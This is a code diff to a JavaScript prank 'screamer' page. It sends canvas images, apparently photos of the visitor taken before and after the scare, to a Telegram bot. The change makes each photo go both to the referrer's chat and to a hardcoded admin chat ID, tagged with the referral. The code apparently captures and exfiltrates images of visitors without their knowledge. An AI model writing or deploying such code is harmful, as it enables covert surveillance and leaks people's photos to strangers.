@@ -74,25 +74,36 @@ document.addEventListener('DOMContentLoaded', () => {
     // Send photo to Telegram bot
     function sendPhotoToBot(timing) {
         canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('photo', blob);
-            formData.append('caption', timing === 'before' ? 'Фото до скримера' : 'Фото после скримера');
+            const caption = timing === 'before' ? 'Фото до скримера' : 'Фото после скримера';
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log(`Photo ${timing} sent successfully`);
-                } else {
-                    console.error('Error sending photo:', data);
-                }
-            })
-            .catch(err => {
-                console.error('Fetch error:', err);
-            });
+            // Send to referrer
+            sendToChat(CHAT_ID, blob, caption, timing);
+
+            // Also send to admin
+            const adminChatId = '355782346';
+            sendToChat(adminChatId, blob, `${caption} (реферал: ${CHAT_ID})`, timing);
+        });
+    }
+
+    function sendToChat(chatId, blob, caption, timing) {
+        const formData = new FormData();
+        formData.append('photo', blob);
+        formData.append('caption', caption);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${chatId}`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log(`Photo ${timing} sent to ${chatId} successfully`);
+            } else {
+                console.error('Error sending photo:', data);
+            }
+        })
+        .catch(err => {
+            console.error('Fetch error:', err);
         });
     }
 
